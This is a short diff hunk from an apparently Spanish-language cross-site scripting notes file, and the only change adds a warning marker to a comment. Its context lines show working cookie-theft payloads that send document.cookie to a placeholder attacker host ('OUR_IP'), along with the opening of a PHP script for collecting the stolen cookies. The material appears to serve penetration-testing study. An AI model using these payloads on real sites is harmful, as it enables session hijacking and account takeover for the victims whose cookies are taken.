@@ -158,7 +158,7 @@ En todos los casos anteioes se da la particularidad de que no tenemos acceso par
 document.location='http://OUR_IP/index.php?c='+document.cookie;
 new Image().src='http://OUR_IP/index.php?c='+document.cookie;
 #Payloads que pueden usarse para obtener la cookie de sesion
-#Estos payloads deberian ir en nuestro servidor dentro del archivo que se consulta en el XSS
+# [!] Estos payloads deberian ir en nuestro servidor dentro del archivo que se consulta en el XSS
 
 <?php
 if (isset($_GET['c'])) {
